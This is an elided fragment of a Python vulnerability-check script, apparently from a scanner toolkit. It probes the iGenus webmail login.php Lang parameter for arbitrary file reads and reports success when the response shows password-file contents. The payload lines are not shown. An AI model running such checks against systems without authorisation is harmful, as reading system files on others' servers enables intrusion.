...
class igenus_login_Lang_fileread:
    ...
    def run(self):
        ...
        try:
            ...
            if r"root:" in req.text and r"/bin/bash" in req.text:
                printGreen("[+]Success:存在iGenus邮箱系统login.php 参数Lang任意文件读取漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在igenus_login_Lang_fileread漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = igenus_login_Lang_fileread(sys.argv[1])
    testVuln.run()
